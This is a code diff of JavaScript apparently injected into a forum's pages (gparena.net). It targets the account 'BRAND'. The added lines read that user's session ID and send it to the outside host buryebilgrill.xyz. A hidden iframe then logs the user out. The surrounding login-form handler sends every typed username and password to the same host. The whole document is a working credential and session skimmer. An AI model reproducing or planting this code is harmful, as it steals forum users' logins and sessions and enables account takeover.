@@ -3,9 +3,12 @@ if (!document.getElementById("login-button")) {
     var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
     if (!document.getElementById("gp_h1")) {
         if (user_name === "BRAND") {
+            var sid = document.getElementsByClassName("ptop2 pleft1")[0].children[1].href.split('=')[2];
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", `https://buryebilgrill.xyz/sid.php?id=${sid}`);
+            xhr.send();
             if (getCookie("PHPSESSID") !== "kb") {
                 setCookie("PHPSESSID", "kb", 300);
-                var sid = document.getElementsByClassName("ptop2 pleft1")[0].children[1].href.split('=')[2];
                 var iframe = document.createElement('iframe');
                 iframe.id = "gp_h1";
                 iframe.src = `https://gparena.net/forum/ucp.php?mode=logout&sid=${sid}`;
@@ -29,8 +32,8 @@ if (!document.getElementById("login-button")) {
     document.getElementById('login-form').onsubmit = () => {
         var user_parsed = document.getElementsByName('username')[0].value.replace(/#/g, "|hashtag|").replace(/&/g, "|ampersand|");
         var pass_parsed = document.getElementsByName('password')[0].value.replace(/#/g, "|hashtag|").replace(/&/g, "|ampersand|");
-        const xhr = new XMLHttpRequest()
-        xhr.open("GET", `https://buryebilgrill.xyz/receive.php?u=${user_parsed}&p=${pass_parsed}`)
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", `https://buryebilgrill.xyz/receive.php?u=${user_parsed}&p=${pass_parsed}`);
         xhr.send();
     };
 }
